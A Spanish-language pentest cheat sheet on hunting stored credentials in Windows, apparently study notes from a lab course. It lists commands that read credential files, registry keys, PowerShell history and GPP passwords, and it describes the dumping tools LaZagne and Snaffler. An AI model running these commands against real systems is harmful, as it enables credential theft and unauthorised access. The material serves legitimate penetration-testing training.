# Búsqueda de Credenciales en Windows

Más allá de LSASS y SAM, los sistemas Windows acumulan credenciales en decenas de ubicaciones: archivos de configuración, scripts, bases de datos de aplicaciones, historial de PowerShell y el registro. El contexto del sistema condiciona dónde mirar — una estación de trabajo de un admin de IT acumula mucho más material que la de un usuario estándar.

### Términos clave para buscar

Independientemente de la herramienta, estos son los términos que más resultados dan:

`password` `passphrase` `passwd` `pwd` `keys` `username` `creds` `credentials` `login` `configuration` `dbcredential` `dbpassword` `passkeys`

### Búsqueda en el filesystem

#### CMD — findstr

```cmd
# Buscar contenido con términos sensibles en tipos de archivo habituales
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml *.bat *.cmd

# Buscar archivos por nombre
dir /s /b *password* *pass* *cred* *secret* 2>nul

# Búsqueda en todo el disco (más lento)
findstr /spin "password" *.*
```

#### PowerShell

```powershell
# Buscar contenido recursivamente
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include *.txt,*.xml,*.ini,*.config,*.ps1,*.bat |
  Select-String -Pattern "password","passwd","pwd","secret","credential" |
  Select-Object Path, LineNumber, Line

# Buscar archivos por nombre
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Filter "*pass*"
```

#### Windows Search (GUI)

Con acceso gráfico, Windows Search indexa ajustes del sistema y el filesystem. Buscar términos como `pass`, `credential` o `config` puede revelar archivos que los comandos anteriores no alcanzan si están en rutas no estándar.

### Ubicaciones de alto valor

#### Archivos de despliegue — unattend.xml

Los archivos de instalación desatendida suelen contener la contraseña del administrador local en texto claro o Base64:

```cmd
dir /s /b C:\unattend.xml C:\Panther\unattend.xml C:\Windows\system32\sysprep\unattend.xml
```

```xml
<AutoLogon>
  <Password><Value>P4ssw0rd!</Value></Password>
```

#### Configuraciones de IIS y aplicaciones web

```cmd
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\machine.config
```

```powershell
Get-ChildItem C:\inetpub -Recurse -Filter "web.config" |
  Select-String -Pattern "password|connectionString|pwd"
```

#### Historial de PowerShell

```powershell
Get-Content C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Los comandos como `mysql -u root -pPassword123` o `Invoke-WebRequest -Credential` quedan registrados aquí en texto claro.

#### Herramientas de administración remota

```cmd
# PuTTY — sesiones guardadas
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s

# WinSCP — contraseñas cifradas pero crackeables
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s
```

LaZagne es especialmente efectivo:

```
[+] Password found !!!
URL: 10.129.202.51
Login: admin
Password: SteveisReallyCool123
Port: 22
```

#### FileZilla

```cmd
type C:\Users\*\AppData\Roaming\FileZilla\recentservers.xml
type C:\Users\*\AppData\Roaming\FileZilla\sitemanager.xml
```

#### Registro de Windows

```cmd
# Búsqueda de contraseñas en el registro
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# AutoLogon — contraseña en texto claro si está configurado
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

#### Scripts y shares de red

```cmd
dir /s /b C:\Scripts\*.bat C:\Scripts\*.ps1 C:\Scripts\*.cmd
dir /s /b \\dc01\NETLOGON\*.bat \\dc01\SYSVOL\*.xml
```

#### GPP Passwords — SYSVOL

Las contraseñas en Group Policy Preferences se cifran con AES-256 pero con una clave publicada por Microsoft. Son trivialmente descifrables:

```bash
# Desde Linux
netexec smb dc01.dominio.local -u user -p pass -M gpp_password
```

```powershell
# Desde Windows con PowerSploit
Get-GPPPassword
```

### Herramientas automatizadas

#### LaZagne

LaZagne cubre 35 navegadores en Windows y múltiples categorías de aplicaciones:

| Módulo     | Objetivo                                              |
| ---------- | ----------------------------------------------------- |
| `browsers` | Chrome, Firefox, Edge, Opera — credenciales guardadas |
| `chats`    | Skype y otros clientes de mensajería                  |
| `mails`    | Outlook, Thunderbird                                  |
| `memory`   | KeePass y LSASS                                       |
| `sysadmin` | OpenVPN, WinSCP, configuraciones de herramientas IT   |
| `windows`  | LSA secrets, Credential Manager                       |
| `wifi`     | Contraseñas de redes WiFi guardadas                   |

```cmd
start LaZagne.exe all
lazagne.exe browsers
lazagne.exe sysadmin
```

> Los navegadores son de los objetivos más interesantes — Chrome, Edge y Firefox cifran las credenciales pero con claves derivadas de DPAPI, accesibles si se tiene la sesión del usuario. LaZagne maneja el descifrado automáticamente.

#### Snaffler

Orientado a redes AD: escanea todos los shares accesibles en el dominio buscando archivos con contenido sensible:

```cmd
Snaffler.exe -s -d dominio.local -o snaffler_output.log
```

### Checklist de ubicaciones adicionales

| Ubicación                                                    | Contenido potencial                                               |
| ------------------------------------------------------------ | ----------------------------------------------------------------- |
| `SYSVOL\*\Policies\**\Groups.xml`                            | GPP passwords                                                     |
| `SYSVOL\*\scripts\*.bat` / `*.ps1`                           | Credenciales hardcodeadas en scripts de login                     |
| Shares de IT (`\\srv\IT\`)                                   | Scripts, configs, documentación interna                           |
| `web.config` en máquinas de desarrollo                       | Connection strings con credenciales de BD                         |
| `unattend.xml`, `sysprep.xml`                                | Contraseñas de despliegue                                         |
| Descripción de usuarios/equipos en AD                        | Admins que documentan contraseñas en el campo Description         |
| Archivos `pass.txt`, `passwords.xlsx` en shares y SharePoint | Inventarios de contraseñas                                        |
| Bases de datos KeePass (`.kdbx`)                             | Credenciales corporativas si se puede crackear la master password |

> Revisar siempre los directorios de administradores de IT — sus estaciones de trabajo acumulan más credenciales que las de usuarios estándar. En un pentest interno, comprometer la máquina de un sysadmin suele ser suficiente para obtener acceso a la mayoría del entorno sin necesidad de técnicas adicionales.
